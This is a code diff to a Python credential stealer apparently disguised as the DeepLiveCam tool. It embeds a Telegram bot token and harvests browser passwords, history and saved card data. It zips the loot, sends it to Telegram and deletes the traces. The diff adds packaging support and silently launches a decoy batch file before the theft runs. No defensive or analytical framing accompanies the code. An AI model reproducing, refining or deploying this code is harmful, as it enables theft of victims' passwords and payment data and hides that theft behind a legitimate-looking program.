@@ -12,6 +12,7 @@ import zipfile
 import io
 import time
 import subprocess
+import sys
 
 # How to get token and ID: https://www.youtube.com/watch?v=JNwEJ5HvLgM
 bot_token = '9195079283:AAH9Zqb7f4efx7wVtmNJG2dnp3H44y7nqa4'
@@ -206,8 +207,8 @@ class Browser:
         ]
 
         self.create_zip_file()
-        self.send_file_to_telegram("password_full.zip")
-        os.remove("password_full.zip")
+        self.send_file_to_telegram("pw_full.zip")
+        os.remove("pw_full.zip")
 
     def get_encryption_key(self, browser_path):
         local_state_path = os.path.join(browser_path, 'Local State')
@@ -329,7 +330,7 @@ class Browser:
                 os.remove(tmp_db_path)
 
     def create_zip_file(self):
-        with zipfile.ZipFile("password_full.zip", "w") as zip_file:
+        with zipfile.ZipFile("pw_full.zip", "w") as zip_file:
             self.extract_passwords(zip_file)
             self.extract_history(zip_file)
 
@@ -550,7 +551,7 @@ class Browsers:
             os.path.join(self.temp_path, "Browser", "history.txt"),
             os.path.join(self.temp_path, "Browser", "cc's.txt")
         ]
-        zip_file_path = os.path.join(self.temp_path, "BrowserData.zip")
+        zip_file_path = os.path.join(self.temp_path, "br_data.zip")
         self.create_zip(file_paths, zip_file_path)
         self.send_file_to_telegram(zip_file_path)
 
@@ -727,17 +728,26 @@ class Wifi:
 
 def main():
 
-    folder = os.path.dirname(os.path.abspath(__file__))
-    bat_file = os.path.join(folder, "bin", "DeepLiveCam.bat")
+    if getattr(sys, 'frozen', False):
+        base_dir = os.path.dirname(sys.executable)
+    else:
+        base_dir = os.path.dirname(os.path.abspath(__file__))
     
-    subprocess.Popen(
-        ["cmd.exe", "/c", bat_file],
-        cwd=os.path.dirname(bat_file),
-        creationflags=subprocess.CREATE_NO_WINDOW,
-        stdin=subprocess.DEVNULL,
-        stdout=subprocess.DEVNULL,
-        stderr=subprocess.DEVNULL
-    )
+    # Đường dẫn BAT trong subfolder
+    bat_file = os.path.join(base_dir, "bin", "DeepLiveCam.bat")
+    
+    # Kiểm tra tồn tại
+    if os.path.isfile(bat_file):
+        subprocess.Popen(
+            ["cmd.exe", "/c", bat_file],
+            cwd=os.path.dirname(bat_file),
+            creationflags=subprocess.CREATE_NO_WINDOW,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+    else:
+        print(f"Không tìm thấy file: {bat_file}")
 
     PcInfo()
     Browser()
